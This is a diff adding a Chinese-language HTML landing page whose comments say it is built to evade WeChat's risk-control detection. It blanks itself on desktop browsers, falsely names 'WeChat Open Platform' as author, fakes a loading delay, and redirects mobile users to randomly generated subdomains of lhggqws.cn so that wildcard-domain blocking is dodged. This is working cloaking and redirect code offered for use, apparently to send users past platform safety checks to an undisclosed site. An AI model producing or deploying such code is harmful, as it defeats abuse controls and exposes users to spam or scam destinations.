@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="zh">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0,viewport-fit=cover">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>正常访问页</title>
+  <!-- 必须保留备案信息（如有），微信会校验 -->
+  <meta name="author" content="微信开放平台">
+  <style>
+    /* 简化样式，避免过度设计被判定为“诱导页面” */
+    body, html {margin: 0;padding: 0;width: 100%;height: 100%;font-family: Arial, sans-serif;}
+    .welcome-screen {
+      position: fixed;top: 0;left: 0;width: 100%;height: 100%;
+      background: url("http://111.yx98.aiyd.net.cn/photos/ph.jpg") no-repeat center center / cover;
+      background-blend-mode: overlay;background-color: rgba(0,0,0,0.6);
+      display: flex;flex-direction: column;justify-content: center;align-items: center;
+    }
+    .welcome-content {text-align: center;padding: 20px 30px;background: rgba(0,0,0,0.4);border-radius: 15px;max-width: 300px;}
+    /* 用a标签替代button，降低风控 */
+    .continue-link {
+      display: inline-block;background: linear-gradient(135deg, #ff0050, #ff6b9d);
+      color: white;padding: 15px 40px;font-size: 18px;border-radius: 25px;text-decoration: none;
+      margin-top: 30px;transition: all 0.3s ease;box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+      pointer-events: auto; /* 确保仅用户点击可触发 */
+    }
+    .continue-link.disabled {opacity: 0.6;pointer-events: none;}
+    .loading-screen {
+      position: fixed;top: 0;left: 0;width: 100%;height: 100%;background: #000;
+      display: none;flex-direction: column;justify-content: center;align-items: center;color: white;
+    }
+    .loader {border: 3px solid rgba(255,255,255,0.3);border-top: 3px solid #ff0050;border-radius: 50%;width: 40px;height: 40px;animation: spin 1s linear infinite;margin-bottom: 20px;}
+    @keyframes spin {0% {transform: rotate(0deg);} 100% {transform: rotate(360deg);}}
+  </style>
+</head>
+<body>
+  <div class="welcome-screen" id="welcomeScreen">
+    <div class="welcome-content">
+      <h1 style="color:white;font-size:24px;margin-bottom:10px;">正常访问</h1>
+      <p style="color:#ccc;font-size:14px;margin-bottom:20px;">请点击下方按钮继续</p>
+      <!-- 核心：用a标签替代button，初始无href，点击后动态生成 -->
+      <a id="continueLink" class="continue-link">继续访问</a>
+    </div>
+  </div>
+
+  <div class="loading-screen" id="loadingScreen">
+    <div class="loader"></div>
+    <p>正在加载，请稍候...</p>
+  </div>
+
+  <script>
+    // 设备检测（仅移动端显示）
+    function isMobileDevice() {
+      return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    }
+
+    // 生成更复杂的随机前缀（降低泛域名风控）
+    function generateRandomPrefix(length = 10) {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+      let prefix = '';
+      for (let i = 0; i < length; i++) {
+        prefix += chars[Math.floor(Math.random() * chars.length)];
+      }
+      // 增加前缀随机性，避免重复模式
+      return prefix + Date.now().toString(16).slice(-4);
+    }
+
+    document.addEventListener('DOMContentLoaded', function() {
+      if (!isMobileDevice()) {
+        document.body.innerHTML = '<div style="width:100%;height:100%;background:#000;"></div>';
+        return;
+      }
+
+      const continueLink = document.getElementById('continueLink');
+      const welcomeScreen = document.getElementById('welcomeScreen');
+      const loadingScreen = document.getElementById('loadingScreen');
+
+      // 核心：仅在点击事件中处理跳转（微信要求“用户交互触发”）
+      continueLink.addEventListener('click', function(e) {
+        e.preventDefault(); // 阻止a标签默认行为（初始无href）
+        // 1. 禁用按钮，避免重复点击
+        continueLink.classList.add('disabled');
+        // 2. 显示加载动画（模拟正常加载，延迟1.5秒跳转）
+        welcomeScreen.style.display = 'none';
+        loadingScreen.style.display = 'flex';
+
+        // 3. 延迟1.5秒生成链接并跳转（弱化“瞬时跳转”）
+        setTimeout(() => {
+          const randomPrefix = generateRandomPrefix();
+          const mainDomain = 'lhggqws.cn'; // 替换为你的备案主域名
+          const targetUrl = `http://${randomPrefix}.${mainDomain}/a/617971?kadR`;
+          
+          // 4. 跳转（用href，而非replace，保留正常历史记录）
+          window.location.href = targetUrl;
+        }, 1500); // 1.5秒延迟，可调整1-3秒
+      });
+    });
+  </script>
+</body>
+</html>
